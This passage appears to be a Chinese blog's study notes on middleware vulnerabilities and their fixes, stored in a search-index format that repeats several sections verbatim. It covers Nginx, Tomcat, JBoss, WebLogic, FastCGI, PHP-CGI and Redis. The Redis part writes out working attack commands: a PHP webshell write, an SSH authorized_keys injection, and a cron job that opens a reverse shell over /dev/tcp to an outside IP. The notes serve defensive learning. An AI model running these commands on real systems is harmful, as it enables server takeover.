on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4目录穿越"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x4-tomcat"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1远程代码执行"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2war后门文件部署"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x5-jboss"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1反序列化漏洞"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2war后门文件部署-1"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x6-weblogic"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1反序列化漏洞-1"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2ssrf"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3任意文件上传"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4war后门文件部署"},{"categories":["hvv"],"content":"\r0x7 FastCGI\r未授权访问、命令执行服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 **修复方法：**更改默认端口 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:7","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x7-fastcgi"},{"categories":["hvv"],"content":"\r0x7 FastCGI\r未授权访问、命令执行服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 **修复方法：**更改默认端口 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:7","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#未授权访问命令执行"},{"categories":["hvv"],"content":"\r0x8 PHPCGI\r远程代码执行在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。 此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。 修复方法： 三种方法： 1）升级php版本；（php-5.3.12以上版本）; 2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。 具体做法： 修改http.conf文件，找到增加以下三行 RewriteEngine on RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC] RewriteRule ^(.*) $1? [L] 重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。 3）打上php补丁。 补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:8","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x8-phpcgi"},{"categories":["hvv"],"content":"\r0x8 PHPCGI\r远程代码执行在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。 此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。 修复方法： 三种方法： 1）升级php版本；（php-5.3.12以上版本）; 2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。 具体做法： 修改http.conf文件，找到增加以下三行 RewriteEngine on RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC] RewriteRule ^(.*) $1? [L] 重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。 3）打上php补丁。 补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/ ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:8","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#远程代码执行"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 